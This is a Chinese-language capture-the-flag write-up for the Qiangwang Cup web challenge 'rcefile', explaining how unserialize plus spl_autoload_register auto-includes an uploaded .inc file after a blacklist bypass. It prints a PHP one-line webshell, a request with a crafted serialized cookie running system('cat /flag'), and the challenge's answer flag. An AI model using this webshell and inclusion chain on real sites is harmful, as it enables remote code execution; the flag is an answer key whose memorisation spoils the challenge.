# rcefile

> 分类：Web（强网先锋）

## 题目描述

扫描发现源码泄露，`showfile.php` 中存在 `spl_autoload_register` 未定义的情况，可触发反序列化类的 `.inc`/`.php` 自动包含，配合上传 `.inc` 木马 getshell。

## 考察知识点

- PHP `spl_autoload_register` 反序列化自动包含
- 文件上传黑名单绕过（`.inc` 后缀）
- PHP 一句话木马

## 解法

1. 下载源码审计，`showfile.php` 用了 `spl_autoload_register`，当类未定义时会执行反序列化类名 + `.inc`/`.php` 的自动包含。
2. `upload.php` 黑名单限制 `["php","php5","php3","html","swf","htm","phtml"]`，上传 `.inc` 文件绕过。
3. 上传内容：

```php
<?php eval($_GET['cmd']);
```

记下返回的文件名 `d6e2555175cf7f64910cbfce15842643.inc`，然后自动包含触发：

```
GET /showfile.php?cmd=system('cat+/flag')%3b
Cookie: O%3a32%3a"D6e2555175cf7f64910cbfce15842643"%3a0%3a{}
```

4. 反序列化类名 + `.inc` 被 `spl_autoload` 包含，执行 eval 读取 flag。

## 参考答案

`flag{b162bb8a-43ac-46ae-a8ab-77b1c3a333fc}`

## 来源

- 作者：404Team | https://www.nynusec.com/archives/第六届强网杯-writeup
- 作者：WHT战队 | https://cn-sec.com/archives/1217881.html
- 作者：or4nge | https://note.f5.pm/go-125939.html
